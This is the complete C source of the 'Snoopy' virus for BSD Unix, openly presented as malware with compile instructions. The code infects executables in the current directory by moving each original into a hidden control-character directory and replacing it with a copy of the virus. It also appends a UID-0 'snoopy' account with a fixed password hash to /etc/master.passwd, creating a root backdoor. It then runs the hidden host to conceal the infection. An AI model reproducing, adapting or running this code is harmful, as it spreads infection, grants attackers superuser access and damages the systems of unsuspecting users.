/* The Snoopy Virus for BSD Free Unix 2.0.2 (and others)           */
/* (C) 1995 American Eagle Publications, Inc. All rights reserved! */
/* Compile with Gnu C, "gcc snoopy.c"                              */

#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>

DIR *dirp;                            /* directory search structure */
struct dirent *dp;                    /* directory entry record */
struct stat st;                       /* file status record */
int stst;                             /* status call status */
FILE *host,*virus, *pwf;              /* host and virus files. */
long FileID;                          /* 1st 4 bytes of host */
char buf[512];                        /* buffer for disk reads/writes */
char *lc,*ld;                         /* used to search for X23 */
size_t amt_read,hst_size;             /* amount read from file, host size */
size_t vir_size=13264;                /* size of X23, in bytes */
char dirname[10];                     /* subdir where X23 stores itself */
char hst[512];

/* snoopy super user entry for the password file, pw='A Snoopy Dog.' */
char snoopy[]="snoopy:$1$LOARloMh$fmBvM4NKD2lcLvjhN5GjF.:0:0::0:0:Nobody:/root:";

void readline() {
  lc=&buf[1];
  buf[0]=0;
  while (*(lc-1)!=10) {
    fread(lc,1,1,pwf);
    lc++;
    }
  }

void writeline() {
  lc=&buf[1];
  while (*(lc-1)!=10) {
    fwrite(lc,1,1,host);
    lc++;
    }
  }

int main(argc, argv, envp)
  int argc;
  char *argv[], *envp[];
  {
    strcpy((char *)&dirname,"./\005");         /* set up host directory name */
    dirp=opendir(".");                              /* begin directory search */
    while ((dp=readdir(dirp))!=NULL) {           /* have a file, check it out */
      if ((stst=stat((const char *)&dp->d_name,&st))==0) {      /* get status */
        lc=(char *)&dp->d_name;
        while (*lc!=0) lc++;
        lc=lc-3;                    /* lc points to last 3 chars in file name */
        if ((!((*lc=='X')&&(*(lc+1)=='2')&&(*(lc+2)=='3')))         /* "X23"? */
                 &&(st.st_mode&S_IXUSR!=0)) {              /* and executable? */
          strcpy((char *)&buf,(char *)&dirname);
          strcat((char *)&buf,"/");
          strcat((char *)&buf,(char *)&dp->d_name);        /* see if X23 file */
          strcat((char *)&buf,".X23");                      /* exists already */
          if ((host=fopen((char *)&buf,"r"))!=NULL) fclose(host);
          else {                                   /* no it doesn't - infect! */
            host=fopen((char *)&dp->d_name,"r");
            fseek(host,0L,SEEK_END);                   /* determine host size */
            hst_size=ftell(host);
            fclose(host);
            if (hst_size>=vir_size) {        /* host must be large than virus */

              mkdir((char *)&dirname,S_IRWXU|S_IRWXG|S_IRWXO);
              rename((char *)&dp->d_name,(char *)&buf);        /* rename host */
              if ((virus=fopen(argv[0],"r"))!=NULL) {
                if ((host=fopen((char *)&dp->d_name,"w"))!=NULL) {
                  while (!feof(virus)) {            /* and copy virus to orig */
                    amt_read=512;                                /* host name */
                    amt_read=fread(&buf,1,amt_read,virus);
                    fwrite(&buf,1,amt_read,host);
                    hst_size=hst_size-amt_read;
                    }
                  fwrite(&buf,1,hst_size,host);
                  fclose(host);
                  chmod((char *)&dp->d_name,S_IRWXU|S_IRWXG|S_IRWXO);
                  strcpy((char *)&buf,(char *)&dirname);
                  strcpy((char *)&buf,"/");
                  strcat((char *)&buf,(char *)&dp->d_name);
                  chmod((char *)&buf,S_IRWXU|S_IRWXG|S_IRWXO);
                  }
                else
                  rename((char *)&buf,(char *)&dp->d_name);
                fclose(virus);                  /* infection process complete */
                }                                            /* for this file */
              else
                rename((char *)&buf,(char *)&dp->d_name);
              }
            }
          }
        }
      }
    (void)closedir(dirp);          /* infection process complete for this dir */

                                /* now see if we can get at the password file */
    if ((pwf=fopen("/etc/master.passwd","r+"))!=NULL) {
      host=fopen("/etc/mast.pw","w");                       /* temporary file */
      stst=0;
      while (!feof(pwf)) {
        readline();                        /* scan the file for user "snoopy" */
        lc=&buf[1];
        if ((*lc=='s')&&(*(lc+1)=='n')&&(*(lc+2)=='o')&&(*(lc+3)=='o')&&
            (*(lc+4)=='p')&&(*(lc+5)=='y')) stst=1;
        writeline();
        }
      if (stst==0) {                                  /* if no "snoopy" found */
        strcpy((char *)&buf[1],(char *)&snoopy);                   /* add it! */
        lc=&buf[1]; while (*lc!=0) lc++;
        *lc=10;
        writeline();
        }
      fclose(host);
      fclose(pwf);
      rename("/etc/mast.pw","/etc/master.passwd");    /* update master.passwd */
      }

    strcpy((char *)&buf,argv[0]);          /* the host is this program's name */
    lc=(char *)&buf;                            /* find end of directory path */
    while (*lc!=0) lc++;
    while (*lc!='/') lc--;
    *lc=0; lc++;
    strcpy((char *)&hst,(char *)&buf);
    ld=(char *)&dirname+1;                         /* insert the ^E directory */
    strcat((char *)&hst,(char *)ld);          /* and put file name on the end */
    strcat((char *)&hst,"/");
    strcat((char *)&hst,(char *)lc);
    strcat((char *)&hst,".X23");                     /* with an X23 tacked on */

    execve((char *)&hst,argv,envp);            /* execute this program's host */
    }
